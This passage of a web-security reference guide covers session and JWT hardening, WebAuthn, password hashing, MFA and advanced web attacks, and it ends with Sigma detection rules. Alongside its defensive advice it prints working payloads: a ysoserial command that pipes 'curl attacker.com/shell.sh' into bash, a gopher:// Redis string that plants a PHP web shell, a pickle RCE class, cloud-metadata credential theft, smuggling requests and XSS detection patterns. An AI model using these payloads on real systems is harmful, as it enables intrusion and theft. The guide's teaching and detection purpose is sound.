**SameSite=Lax default implications.** Since Chrome 80 (February 2020) and subsequently Firefox and Edge, cookies without an explicit `SameSite` attribute default to `Lax`. This broke CSRF attacks that relied on cross-site POST forms carrying session cookies. However, `Lax` still sends cookies on top-level GET navigations, which means CSRF via `GET` state-changing endpoints remains exploitable. Applications must never perform state changes on `GET` requests.

**Session fixation prevention — regeneration checklist:**

The framework-level regeneration shown in §4.5 addresses the basic case. Additional requirements:
1. Regenerate the session ID on every privilege-level change (login, role escalation, password change).
2. Invalidate the old session ID server-side — do not merely issue a new cookie while the old session remains valid in the session store.
3. Bind sessions to client fingerprint metadata (IP subnet, User-Agent hash) as a secondary validation. Flag mismatches rather than hard-blocking to avoid breaking mobile users who switch networks.
4. Set an absolute session lifetime (e.g., 8 hours) in addition to idle timeout (e.g., 30 minutes). Absolute lifetime prevents indefinite session extension via activity.

**Session token entropy.** RFC 6750 recommends at least 128 bits of entropy for bearer tokens. In practice, use a CSPRNG producing 256-bit (32-byte) values encoded in hex or base64url:

```python
# Python — session token generation
import secrets
token = secrets.token_urlsafe(32)  # 256 bits, base64url-encoded → 43 characters
```

```js
// Node.js — session token generation
const crypto = require('crypto');
const token = crypto.randomBytes(32).toString('base64url');  // 256 bits
```

Weak entropy sources that have caused real vulnerabilities: `Math.random()` (deterministic PRNG, not cryptographic), sequential counters, MD5 of timestamp, PID-seeded PRNGs.

### 11.2 JWT security — beyond basic attacks

Extending the attack taxonomy from §4.3 with implementation-level security controls.

**CVE-2022-23529 — jsonwebtoken prototype pollution → arbitrary code execution.** The `jsonwebtoken` npm package (>10 million weekly downloads) before version 9.0.0 was vulnerable to prototype pollution via the `secretOrPublicKey` parameter. An attacker who controlled the key object passed to `jwt.verify()` could inject a `toString` method via prototype pollution, achieving arbitrary code execution when the library called `key.toString()` during verification. CVSS 7.6 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L). CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes).

```js
// CVE-2022-23529 — vulnerable pattern (jsonwebtoken < 9.0.0)
// If an attacker controls the key object (e.g., via deserialized input):
const maliciousKey = {};
maliciousKey.__proto__.toString = function() {
  // Arbitrary code execution during jwt.verify()
  require('child_process').execSync('id > /tmp/pwned');
  return 'key-content';
};
jwt.verify(token, maliciousKey);  // triggers toString() internally

// Mitigation: upgrade to jsonwebtoken >= 9.0.0
// Pin in package.json: "jsonwebtoken": "^9.0.0"
```

**Token lifetime strategy.** Short-lived access tokens combined with longer-lived refresh tokens limit the blast radius of token theft:

| Token type | Recommended lifetime | Storage | Notes |
|------------|---------------------|---------|-------|
| Access token | 5–15 minutes | Memory (not localStorage) | Short lifetime limits exposure window; XSS cannot steal from memory if page is refreshed |
| Refresh token | 1–30 days | `HttpOnly` `Secure` `SameSite=Strict` cookie | Longer lifetime for UX; rotate on each use |
| ID token (OIDC) | Match access token | Memory | Used only for identity claims; not for API authorization |

**Refresh token rotation.** Each time a refresh token is used, the server issues a new refresh token and invalidates the old one. If an attacker steals and uses a refresh token, the legitimate user's next refresh attempt uses the old (now-invalidated) token, triggering a security event:

```python
# Refresh token rotation — server-side logic (pseudocode)
def refresh(request):
    old_token = request.cookies.get('refresh_token')
    stored = db.get_refresh_token(old_token)

    if stored is None:
        # Token not found — either expired, already rotated, or stolen.
        # If the token family exists but the token was already consumed,
        # this indicates a replay attack. Revoke the entire family.
        family = db.get_token_family_by_token(old_token)
        if family:
            db.revoke_all_tokens_in_family(family.id)
            log.security(f"Refresh token replay detected for user {family.user_id}")
        return Response(status=401)

    # Issue new tokens
    new_access = generate_access_token(stored.user_id, ttl=900)
    new_refresh = generate_refresh_token(stored.user_id, family=stored.family_id)

    # Invalidate old refresh token
    db.invalidate_refresh_token(old_token)

    response = Response(json={'access_token': new_access})
    response.set_cookie(
        '__Host-refresh', new_refresh,
        httponly=True, secure=True, samesite='Strict', path='/', max_age=86400 * 7
    )
    return response
```

**JWT claim validation checklist:**
- `exp` — reject expired tokens (clock skew tolerance ≤ 30 seconds).
- `nbf` (not before) — reject tokens used before their validity period.
- `iss` (issuer) — exact match against expected issuer URI.
- `aud` (audience) — exact match against the API's identifier; reject tokens intended for other services.
- `sub` (subject) — use as the primary identity claim; never trust client-supplied identity from other fields.
- `iat` (issued at) — reject tokens issued suspiciously far in the past (beyond max token lifetime + clock skew).
- `jti` (JWT ID) — store in a server-side deny-list on revocation; check on each request for critical operations.

### 11.3 WebAuthn / FIDO2 — advanced implementation

Extending the overview in §4.6 with credential types, attestation details, and implementation pitfalls.

**Discoverable credentials (resident keys).** FIDO2 introduced resident credentials stored on the authenticator itself (not just a credential ID that the server must supply). This enables usernameless authentication: the user inserts their security key or activates a platform authenticator, the authenticator presents all stored credentials for the relying party, and the user selects one. The server sends an empty `allowCredentials` list in the `PublicKeyCredentialRequestOptions`:

```js
// Server-side — WebAuthn authentication with discoverable credentials
const assertionOptions = {
  challenge: crypto.randomBytes(32),
  rpId: 'example.com',
  allowCredentials: [],  // Empty — authenticator selects the credential
  userVerification: 'preferred',
  timeout: 60000,
};
```

**Attestation types:**

| Type | Description | Use case |
|------|-------------|----------|
| `none` | No attestation data; the RP trusts the credential without knowing the authenticator model | Consumer applications where authenticator type doesn't matter |
| `indirect` | Attestation may be anonymized by a privacy CA; authenticator model is verifiable but manufacturer identity may be obscured | Privacy-conscious deployments |
| `direct` | Full attestation statement from the authenticator; RP can verify the exact authenticator model and manufacturer | High-security environments (banking, government) |
| `enterprise` | Attestation includes a uniquely identifying certificate; RP can track the individual physical authenticator | Enterprise device management |

**Security properties of WebAuthn vs. other factors:**

| Property | Password | TOTP | Push notification | WebAuthn |
|----------|----------|------|-------------------|----------|
| Phishing resistant | No | No | Partial (number matching helps) | Yes (origin-bound) |
| Replay resistant | No (if stolen) | No (within 30s window) | Yes | Yes |
| Requires secret storage on server | Yes (hash) | Yes (shared secret) | Yes (device token) | No (public key only) |
| MitM resistant | No | No | Partial | Yes (channel binding) |
| Credential reuse across sites | Common | Per-site secret | Per-site device token | Cryptographically impossible |

**Implementation pitfalls:**
1. **rpId mismatch.** If `rpId` is set to a subdomain (`auth.example.com`) instead of the registrable domain (`example.com`), credentials won't work on other subdomains. Set `rpId` to the eTLD+1.
2. **Missing user verification.** Setting `userVerification: 'discouraged'` skips the PIN/biometric check on the authenticator. Acceptable for 2FA (the password is the first factor), but not for passwordless flows where the authenticator is the sole factor.
3. **Ignoring the signature counter.** The authenticator increments a counter on each authentication. If the server receives a counter value ≤ the stored counter, the authenticator may have been cloned. Implement counter validation:

```python
# Python (py_webauthn) — signature counter validation
from webauthn import verify_authentication_response

verification = verify_authentication_response(
    credential=credential_response,
    expected_challenge=session['challenge'],
    expected_rp_id='example.com',
    expected_origin='https://example.com',
    credential_public_key=stored_credential.public_key,
    credential_current_sign_count=stored_credential.sign_count,
    require_user_verification=True,
)

if verification.new_sign_count <= stored_credential.sign_count:
    # Possible cloned authenticator — alert security team and force re-enrollment
    log.security(f"Signature counter regression for user {user.id}: "
                 f"stored={stored_credential.sign_count}, received={verification.new_sign_count}")
    revoke_credential(stored_credential.id)
    raise AuthenticationError("Authenticator may be cloned")

stored_credential.sign_count = verification.new_sign_count
db.save(stored_credential)
```

4. **Not storing attestation data.** Even if attestation isn't required at registration time, store the attestation object. If a key compromise is later discovered in a specific authenticator model (e.g., Infineon TPM RSA key generation flaw, CVE-2017-15361), you can identify and revoke affected credentials.

### 11.4 Password security

**Credential stuffing defense.** Credential stuffing uses username/password pairs leaked from breached databases against other services. Defenses:

1. **Breached password checking via k-anonymity (HaveIBeenPwned API).** Hash the password with SHA-1, send the first 5 hex characters to the HIBP API, receive all hashes with that prefix, and check locally:

```python
import hashlib
import requests

def is_password_breached(password: str) -> tuple[bool, int]:
    sha1 = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]

    resp = requests.get(
        f'https://api.pwnedpasswords.com/range/{prefix}',
        headers={'Add-Padding': 'true'},  # Padding prevents response-size side channel
        timeout=5,
    )
    resp.raise_for_status()

    for line in resp.text.splitlines():
        hash_suffix, count = line.split(':')
        if hash_suffix == suffix:
            return True, int(count)
    return False, 0
```

2. **Rate limiting.** Limit login attempts per account (e.g., 5 failures in 15 minutes → temporary lockout or CAPTCHA challenge) and per IP (e.g., 20 failures across any accounts from one IP in 5 minutes → IP-level throttle).

3. **Device fingerprinting.** Flag logins from previously-unseen devices or impossible-travel scenarios (login from two geographically distant locations within a short time window).

**Password hashing — algorithm selection:**

| Algorithm | Recommended parameters | Notes |
|-----------|----------------------|-------|
| Argon2id | `m=65536` (64 MB), `t=3` (iterations), `p=4` (parallelism) | OWASP recommended; memory-hard; resistant to GPU/ASIC attacks; winner of the Password Hashing Competition (2015) |
| bcrypt | cost factor 12 (≈250ms on modern hardware) | Well-proven; 72-byte password limit (truncates silently); use pre-hashing with SHA-256 if passwords may exceed 72 bytes |
| scrypt | `N=2^17`, `r=8`, `p=1` | Memory-hard; less widely deployed than Argon2id; complex parameter tuning |

**Argon2id — reference implementation:**

```python
# Python — argon2-cffi
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # iterations
    memory_cost=65536,  # 64 MB
    parallelism=4,
    hash_len=32,
    salt_len=16,
    type=argon2.Type.ID,  # Argon2id — hybrid of data-dependent and data-independent
)

hashed = ph.hash("user_password")
# Returns: $argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>

try:
    ph.verify(hashed, "user_password")
    if ph.check_needs_rehash(hashed):
        # Parameters have changed — rehash with current parameters
        new_hash = ph.hash("user_password")
        db.update_password_hash(user_id, new_hash)
except argon2.exceptions.VerifyMismatchError:
    raise AuthenticationError("Invalid password")
```

```js
// Node.js — argon2
const argon2 = require('argon2');

const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 65536,  // 64 MB
  timeCost: 3,
  parallelism: 4,
});

const valid = await argon2.verify(hash, password);
```

### 11.5 Multi-factor authentication — security comparison

**TOTP (Time-based One-Time Password, RFC 6238):**
- Shared secret between server and authenticator app. Server stores the secret; compromise of the server database exposes all TOTP secrets.
- 30-second window with ±1 window tolerance. An attacker who captures a code has 90 seconds to use it.
- Vulnerable to real-time phishing: the attacker proxies the victim's credentials and TOTP code to the legitimate server within the validity window. Tools: Evilginx2, Modlishka.
- Not replay-resistant across the validity window — the same code works multiple times within 30 seconds unless the server tracks used codes.

**WebAuthn (covered in §11.3):**
- Strongest factor. Origin-bound, phishing-resistant, no shared secret on the server.
- Hardware cost barrier (security keys cost $25–$60). Platform authenticators (Touch ID, Windows Hello, Android biometrics) eliminate the hardware cost but tie the credential to a specific device.

**Push notification (e.g., Duo Push, Microsoft Authenticator):**
- User approves/denies on their registered device. Vulnerable to "MFA fatigue" (prompt bombing) — the attacker repeatedly triggers push notifications until the user approves to stop the annoyance.
- Mitigations: number matching (user must enter a number displayed on the login screen into the authenticator app), geographic context display, rate limiting of push attempts.
- CVE-2022-26501 (Cisco Duo) and the 2022 Uber breach (Lapsus$ gained access via MFA fatigue on Duo Push) demonstrate the real-world risk.

**SMS OTP:**
- Weakest factor. Vulnerable to SIM swapping, SS7 interception, malware with SMS permissions, social engineering of carrier support staff.
- NIST SP 800-63B deprecated SMS OTP as a preferred authenticator in 2016 and restricts it to cases where the phone number is verified as belonging to the user.
- Still widely deployed due to universal phone availability and zero setup cost.

---

## 12. Advanced web attack techniques

### 12.1 DOM clobbering

DOM clobbering exploits the browser's behavior of creating global variables for elements with `id` or `name` attributes. An element `<img id="x">` creates `window.x` pointing to that element. An element `<form id="y"><input name="z">` creates `window.y.z` pointing to the input element.

**Mechanism.** If application JavaScript accesses a global variable that it expects to be undefined or an object, and an attacker can inject HTML (even without script execution — e.g., through a sanitizer that allows `id` and `name` attributes), the attacker can clobber that variable:

```html
<!-- Attacker-injected HTML (no script tags needed) -->
<a id="config" href="https://attacker.com/malicious.js"></a>
```

```js
// Application JavaScript — vulnerable pattern
const scriptUrl = window.config || 'https://cdn.example.com/default.js';
// If window.config is clobbered, scriptUrl = the anchor element
// scriptUrl.toString() returns "https://attacker.com/malicious.js" (href value)
const script = document.createElement('script');
script.src = scriptUrl;  // Loads attacker's script
document.body.appendChild(script);
```

**Clobbering nested properties with `<form>` + `<input>`:**

```html
<!-- Clobber window.config.url -->
<form id="config"><input name="url" value="https://attacker.com/evil.js"></form>
```

```js
// window.config → the form element
// window.config.url → the input element
// window.config.url.value → "https://attacker.com/evil.js"
```

**Real-world CVEs:**
- **CVE-2021-23631 — sanitize-html DOM clobbering bypass.** The `sanitize-html` npm package allowed elements with `id` and `name` attributes through sanitization, enabling DOM clobbering in downstream applications. Attackers could clobber security-critical global variables without injecting script tags.
- **CVE-2020-6802 — Firefox built-in sanitizer bypass.** The initial implementation of the Sanitizer API in Firefox was vulnerable to DOM clobbering because it preserved `id` attributes on allowed elements, enabling post-sanitization script execution through clobbered variables.

**Mitigation:**
```js
// Defensive coding — never rely on globals for security-critical values
// Use module-scoped variables or Object.hasOwnProperty checks
const CONFIG = Object.freeze({
  scriptUrl: 'https://cdn.example.com/app.js',
  apiBase: 'https://api.example.com',
});

// If you must access a global, verify its type
if (typeof window.config === 'object' && !(window.config instanceof HTMLElement)) {
  // Safe to use
}
```

### 12.2 HTTP request smuggling

HTTP request smuggling exploits disagreements between front-end (reverse proxy, CDN, load balancer) and back-end servers about where one HTTP request ends and the next begins. The disagreement arises from conflicting interpretation of `Content-Length` (CL) and `Transfer-Encoding: chunked` (TE) headers.

**CL.TE — front-end uses Content-Length, back-end uses Transfer-Encoding:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end sees `Content-Length: 13` and forwards 13 bytes (`0\r\n\r\nSMUGGLED`). The back-end processes `Transfer-Encoding: chunked`, reads chunk size `0` (end of chunks), and treats `SMUGGLED` as the beginning of the next request in the pipeline. That "next request" is prepended to whatever legitimate request arrives next from another user.

**TE.CL — front-end uses Transfer-Encoding, back-end uses Content-Length:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

The front-end processes chunked encoding (reads chunk `8` → `SMUGGLED`, then chunk `0` → end). The back-end uses `Content-Length: 3` and reads only `8\r\n`, treating the rest as a new request.

**TE.TE — both use Transfer-Encoding, but with obfuscation:**

```http
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Transfer-Encoding: x-chunked

0

SMUGGLED
```

One server processes `chunked`, the other doesn't recognize `x-chunked` and falls back to Content-Length or another behavior. Obfuscation variants: `Transfer-Encoding : chunked` (space before colon), `Transfer-Encoding: chunked\r\nTransfer-encoding: x` (duplicate headers), `Transfer-Encoding:\tchunked` (tab instead of space).

**Exploitation — cache poisoning via smuggling.** The smuggled request targets a static resource URL (e.g., `/static/main.js`) with a malicious `Host` header or body. The response is cached by the CDN and served to all subsequent users requesting that resource. Combined with XSS payloads, this poisons the cache with a malicious script.

**Exploitation — authentication bypass.** The smuggled request includes another user's session cookie (obtained via XSS or header injection) and requests a privileged endpoint, bypassing WAF rules that only inspect the front-end request.

**Real-world CVEs:**
- **CVE-2023-25690 — Apache HTTP Server mod_proxy request smuggling.** Apache `mod_proxy` with `RewriteRule` misconfiguration allowed HTTP request smuggling, enabling cache poisoning and auth bypass. CVSS 9.8. CWE-444.
- **CVE-2022-1388 — F5 BIG-IP authentication bypass.** HTTP request smuggling via manipulated `Connection` and `X-F5-Auth-Token` headers allowed unauthenticated remote code execution on F5 BIG-IP devices. Exploited in the wild. CVSS 9.8.

**Detection — Burp Suite HTTP Request Smuggler extension:**
1. Install the "HTTP Request Smuggler" extension from BApp Store.
2. Right-click on the target in the site map → Extensions → HTTP Request Smuggler → Smuggle Probe.
3. The extension sends timing-based probes to detect CL.TE and TE.CL discrepancies.
4. Positive results appear in the extension's output tab with specific smuggling variant.

### 12.3 Web cache poisoning

Web cache poisoning injects malicious content into cached responses by manipulating inputs that influence the response but are not included in the cache key.

**Unkeyed headers.** The cache key typically includes the URL, Host header, and query string. Headers like `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, and `X-Rewrite-URL` are often not part of the cache key but are reflected in the response:

```http
GET /en HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
...
<link rel="canonical" href="https://attacker.com/en"/>
<script src="https://attacker.com/resources/main.js"></script>
```

The response is cached. All subsequent users requesting `/en` receive the poisoned response loading scripts from `attacker.com`.

**Cache key normalization attacks.** Some CDNs normalize the URL before computing the cache key (lowercasing the path, sorting query parameters, decoding percent-encoded characters) but forward the un-normalized URL to the origin. An attacker sends a request with a non-normalized URL that the origin interprets differently:

```http
GET /profile%23<script>alert(1)</script> HTTP/1.1
Host: target.com
```

The CDN normalizes to `/profile#<script>alert(1)</script>` (decoding `%23` to `#`), computes a cache key of `/profile` (ignoring the fragment), but forwards the original URL. If the origin reflects the path without sanitization, the response contains the XSS payload and is cached under the key `/profile`.

**Detection — param-miner (Burp Suite extension):**

```
# Burp Suite → Extensions → Param Miner
# Right-click target → Extensions → Param Miner → Guess Headers
# The extension fuzzes headers and identifies unkeyed inputs
# that change the response content
```

**Real-world CVEs:**
- **CVE-2020-11022 / CVE-2020-11023 — jQuery XSS combined with cache poisoning.** jQuery's `htmlPrefilter` regex allowed XSS via crafted HTML. When combined with web cache poisoning (injecting a poisoned jQuery CDN response), the attack became wormable across all sites using the cached CDN resource.

**Mitigation:**
- Include all response-influencing headers in the cache key (`Vary` header).
- Strip unknown/unexpected headers at the CDN edge before forwarding to the origin.
- Use `Cache-Control: private, no-store` for personalized or sensitive responses.
- Validate and reject unexpected `X-Forwarded-*` headers at the application layer.

### 12.4 Server-Side Request Forgery (SSRF)

SSRF allows an attacker to induce the server-side application to make HTTP requests to an arbitrary destination, typically targeting internal services, cloud metadata endpoints, or localhost.

**Cloud metadata exploitation.** Cloud providers expose instance metadata at `http://169.254.169.254/` (AWS, GCP, Azure). SSRF to this endpoint leaks IAM credentials, instance identity tokens, user-data scripts (which often contain secrets), and network configuration:

```http
# AWS IMDSv1 — single unauthenticated GET
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Response includes temporary credentials:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-15T12:00:00Z"
}
```

**IMDSv2 defense.** AWS Instance Metadata Service v2 requires a PUT request with a TTL header to obtain a session token, then includes that token in subsequent GET requests. SSRF exploits that only trigger GET requests (e.g., via `<img src>` or `fetch()`) cannot obtain the token. However, if the SSRF allows arbitrary HTTP methods and headers (e.g., via `fetch()` with full control), IMDSv2 can still be bypassed:

```js
// SSRF payload that bypasses IMDSv2 (if attacker controls fetch options)
const tokenResp = await fetch('http://169.254.169.254/latest/api/token', {
  method: 'PUT',
  headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' },
});
const token = await tokenResp.text();
const credsResp = await fetch(
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role',
  { headers: { 'X-aws-ec2-metadata-token': token } },
);
```

**DNS rebinding.** The server validates the URL hostname against a deny-list (e.g., rejecting `169.254.169.254` and private RFC 1918 ranges). The attacker registers a domain with a short DNS TTL that initially resolves to a public IP (passing validation) and then switches to an internal IP (e.g., `169.254.169.254`). The server's second DNS resolution (when making the actual request) resolves to the internal IP.

**Protocol smuggling.** SSRF payloads can target non-HTTP protocols through the URL scheme: `gopher://`, `dict://`, `file:///`, `ldap://`. The `gopher://` protocol is particularly dangerous because it allows sending arbitrary bytes, enabling exploitation of Redis, Memcached, or SMTP servers listening on localhost:

```
# SSRF → Redis command injection via gopher://
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2418%0D%0A/var/www/html/cmd%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A
```

**Mitigation:**
- Allow-list of permitted destination hosts/IPs. Deny-listing is insufficient (DNS rebinding bypasses it).
- Resolve DNS and validate the resolved IP before making the request (prevent rebinding by pinning the resolution).
- Disable unnecessary URL schemes (`gopher://`, `file://`, `dict://`).
- Use AWS IMDSv2 with hop limit of 1 (`HttpPutResponseHopLimit=1` prevents container-level SSRF from reaching the host metadata).
- Network-level segmentation: application servers should not have network routes to the metadata endpoint unless required.

### 12.5 Deserialization attacks

Insecure deserialization allows an attacker to manipulate serialized objects to achieve remote code execution, privilege escalation, or arbitrary object instantiation.

**Java — ysoserial.** Java's `ObjectInputStream.readObject()` deserializes arbitrary Java objects. If the classpath contains "gadget chains" (sequences of method calls triggered during deserialization), the attacker can chain them to execute arbitrary commands:

```bash
# Generate a payload using ysoserial
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh | bash" > payload.bin

# Common gadget chains:
# CommonsCollections1-7   — Apache Commons Collections (most ubiquitous)
# Groovy1                 — Groovy runtime
# Spring1/Spring2         — Spring Framework
# JBossInterceptors1      — JBoss/WildFly
# Hibernate1              — Hibernate ORM
# Jdk7u21                 — JDK 7 internal classes (no extra dependencies)
```

**Detection — identifying Java deserialization endpoints:**
```bash
# Java serialized objects start with magic bytes AC ED 00 05
# Base64-encoded: rO0AB
grep -rn "rO0AB" --include="*.log" --include="*.txt" .
# In HTTP traffic, look for Content-Type: application/x-java-serialized-object
```

**.NET — ysoserial.net.** Similar concept for .NET `BinaryFormatter`, `ObjectStateFormatter`, `XmlSerializer`, and `DataContractSerializer`:

```powershell
# Generate a .NET deserialization payload
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -enc <base64>" -o raw > payload.bin

# Common .NET gadget chains:
# TypeConfuseDelegate   — System.Delegate
# PSObject              — PowerShell
# TextFormattingRunProperties — PresentationFramework.dll
# ActivitySurrogateSelector  — System.Workflow
```

**Python pickle.** Python's `pickle.loads()` executes arbitrary code during deserialization via the `__reduce__` method:

```python
import pickle
import base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('id > /tmp/pwned',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# Send this payload to any endpoint that calls pickle.loads() on user input
```

**PHP deserialization.** PHP's `unserialize()` triggers magic methods (`__wakeup`, `__destruct`, `__toString`) that can be chained into gadgets:

```php
// Vulnerable pattern
$data = unserialize($_COOKIE['session']);
// If the application classpath contains classes with dangerous magic methods,
// an attacker can craft a serialized object chain to achieve code execution.

// Tool: PHPGGC (PHP Generic Gadget Chains)
// phpggc Laravel/RCE1 system 'id' -b  # Base64 output
```

**Mitigation across languages:**
- Never deserialize untrusted input with native serialization formats.
- Use data-only formats (JSON, Protocol Buffers, MessagePack) that don't support arbitrary object instantiation.
- Java: replace `ObjectInputStream` with safe alternatives; if unavoidable, use `ObjectInputFilter` (JEP 290, Java 9+) to allowlist permitted classes.
- Python: replace `pickle` with `json` for data exchange; if pickle is required, use `hmac` to sign serialized data and verify before deserializing.
- .NET: avoid `BinaryFormatter` (Microsoft has deprecated it as of .NET 8); use `System.Text.Json` or `JsonSerializer`.

### 12.6 GraphQL security

GraphQL's flexibility introduces attack surfaces absent in REST APIs.

**Introspection abuse.** By default, GraphQL endpoints expose the entire schema via introspection queries:

```graphql
# Full schema dump
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name } }
      }
    }
    mutationType { name fields { name } }
    queryType { name fields { name } }
  }
}
```

Introspection reveals internal types, hidden fields, administrative mutations, and relationships that the API documentation may not expose. Disable introspection in production:

```js
// Apollo Server — disable introspection in production
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production',
});
```

**Batch query DoS.** GraphQL allows multiple queries in a single request. Without limits, an attacker can send deeply nested or aliased queries that consume exponential server resources:

```graphql
# Deeply nested query — exponential resource consumption
{
  users(first: 100) {
    friends(first: 100) {
      friends(first: 100) {
        friends(first: 100) {
          name email
        }
      }
    }
  }
}

# Alias-based batching — bypass rate limiting
{
  q1: user(id: "1") { email }
  q2: user(id: "2") { email }
  # ... repeat 10,000 times
  q10000: user(id: "10000") { email }
}
```

**Mitigation — query complexity analysis:**
```js
// graphql-query-complexity (Apollo Server plugin)
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    createComplexityLimitRule(1000, {  // Max complexity score
      scalarCost: 1,
      objectCost: 10,
      listFactor: 20,
    }),
  ],
  plugins: [
    {
      requestDidStart: () => ({
        didResolveOperation({ request, document }) {
          // Also enforce max depth
          const depth = calculateDepth(document);
          if (depth > 10) throw new Error('Query too deep');
        },
      }),
    },
  ],
});
```

**Authorization bypass patterns.** GraphQL's single-endpoint architecture means authorization must be enforced at the resolver level, not at the route level:

```js
// VULNERABLE — no authorization on resolver
const resolvers = {
  Query: {
    adminUsers: (_, __, context) => db.getAdminUsers(),  // No auth check
  },
};

// CORRECT — resolver-level authorization
const resolvers = {
  Query: {
    adminUsers: (_, __, context) => {
      if (!context.user || context.user.role !== 'admin') {
        throw new ForbiddenError('Admin access required');
      }
      return db.getAdminUsers();
    },
  },
};
```

Common patterns: accessing admin mutations via introspection discovery, querying related objects through nested relationships to bypass field-level access controls (e.g., `user → orders → otherUser → privateField`), and exploiting `__typename` to enumerate types the user shouldn't know about.

---

## 13. Web detection engineering

Building on the SIEM rules in §10 and the ModSecurity CRS in §10.3, this section provides detection signatures for the advanced attack techniques in §12 and the authentication attacks in §11.

### 13.1 Sigma rules

**XSS payload patterns in WAF logs:**
```yaml
title: XSS Payload in HTTP Request Parameters
id: 8a010e2a-1f3b-4c5d-9e2a-7b8c3d4e5f6a
status: stable
description: Detects common XSS payload patterns in URL parameters and POST bodies
logsource:
  category: webserver
  product: any
detection:
  selection_script:
    cs_uri_query|contains:
      - '<script'
      - 'javascript:'
      - 'onerror='
      - 'onload='
      - 'onfocus='
      - 'onmouseover='
  selection_encoded:
    cs_uri_query|contains:
      - '%3Cscript'
      - '%3cscript'
      - 'java%73cript'
      - '%6Aavascript'
  selection_svg:
    cs_uri_query|contains:
      - '<svg/onload'
      - '<svg%20onload'
      - '<math>'
  condition: selection_script or selection_encoded or selection_svg
level: high
tags:
  - attack.initial_access
  - attack.t1189
```

**CSRF token absence on state-changing requests:**
```yaml
title: State-Changing Request Without CSRF Token
id: 9b121f3b-2c4d-5e6f-af3b-8c9d0e1f2a3b
status: experimental
description: POST/PUT/DELETE requests to authenticated endpoints missing CSRF token header or parameter
logsource:
  category: webserver
  product: any
detection:
  selection:
    cs_method:
      - POST
      - PUT
      - DELETE
    cs_uri_stem|contains:
      - '/api/account'
      - '/api/settings'
      - '/api/transfer'
      - '/api/admin'
  filter_csrf_header:
    cs_header|contains: 'X-CSRF-Token'
  filter_csrf_param:
    cs_uri_query|contains: 'csrf_token='
  condition: selection and not filter_csrf_header and not filter_csrf_param
level: medium
tags:
  - attack.execution
  - attack.t1190
```

**OAuth authorization code replay detection:**
```yaml
title: OAuth Authorization Code Reuse
id: ac232a4c-3d5e-6f7a-b04c-9d0e1f2a3b4c
status: stable
description: Detects reuse of an OAuth authorization code which should be single-use per RFC 6749 Section 4.1.2
logsource:
  category: application
  product: oauth_server
detection:
  selection:
    event_type: 'token_exchange'
    grant_type: 'authorization_code'
  filter:
    status: 'code_already_used'
  condition: selection and filter
  timeframe: 5m
level: high
tags:
  - attack.credential_access
  - attack.t1550.001
```

**JWT with `none` algorithm:**
```yaml
title: JWT Token with None Algorithm
id: bd343b5d-4e6f-7a8b-c15d-ae1f2a3b4c5d
status: stable
description: Detects JWT tokens submitted with alg=none indicating a signature bypass attempt
logsource:
  category: webserver
  product: any
detection:
  selection:
    cs_header_authorization|re: 'Bearer\s+eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.$'
    # JWT with empty signature (trailing dot with nothing after)
  selection_decoded:
    # If decoded JWT logging is available:
    jwt_algorithm:
      - 'none'
      - 'None'
      - 'NONE'
      - 'nOnE'
  condition: selection or selection_decoded
level: critical
tags:
  - attack.credential_access
  - attack.t1550
```

**Suspicious OAuth redirect_uri patterns:**
```yaml
title: Suspicious OAuth redirect_uri Manipulation
id: ce454c6e-5f7a-8b9c-d26e-bf2a3b4c5d6e
status: experimental
description: Detects redirect_uri values that may indicate OAuth authorization code theft
logsource:
  category: application
  product: oauth_server
detection:
  selection_open_redirect:
    redirect_uri|contains:
      - 'redirect='
      - 'url='
      - 'next='
      - 'return='
      - 'goto='
  selection_subdomain_takeover:
    redirect_uri|re: 'https?://[a-z0-9-]+\.(s3|cloudfront|herokuapp|azurewebsites|github\.io)\.'
  selection_encoding:
    redirect_uri|contains:
      - '%2F%2F'
      - '%252F'
      - '@'
  condition: selection_open_redirect or selection_subdomain_takeover or selection_encoding
level: high
tags:
  - attack.credential_access
  - attack.t1528
```

**HTTP request smuggling indicators:**
```yaml
title: HTTP Request Smuggling Indicators
id: df565d7f-6a8b-9c0d-e37f-ca3b4c5d6e7f
status: experimental
description: Detects indicators of HTTP request smuggling attempts in WAF logs
logsource:
  category: webserver
  product: any
detection:
  selection_duplicate_cl:
    cs_header|re: 'Content-Length.*Content-Length'
